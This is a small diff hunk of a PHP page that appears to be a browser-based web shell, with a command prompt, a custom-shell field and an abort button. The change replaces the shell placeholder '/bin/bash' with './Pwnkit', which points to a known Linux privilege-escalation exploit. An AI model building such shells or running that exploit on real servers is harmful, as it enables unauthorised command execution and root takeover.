@@ -467,7 +467,7 @@ $user = $user_info['name'];
            <span class="prompt">$ </span>
            <input type="text" id="command" autofocus>
            <div class="custom-shell-group">
-               <input type="text" id="custom_shell" placeholder="(e.g. /bin/bash)">
+               <input type="text" id="custom_shell" placeholder="(e.g. ./Pwnkit)">
                <button id="abortButton" class="action-btn" style="display:none;">Abort Task</button>
            </div>
         </div>
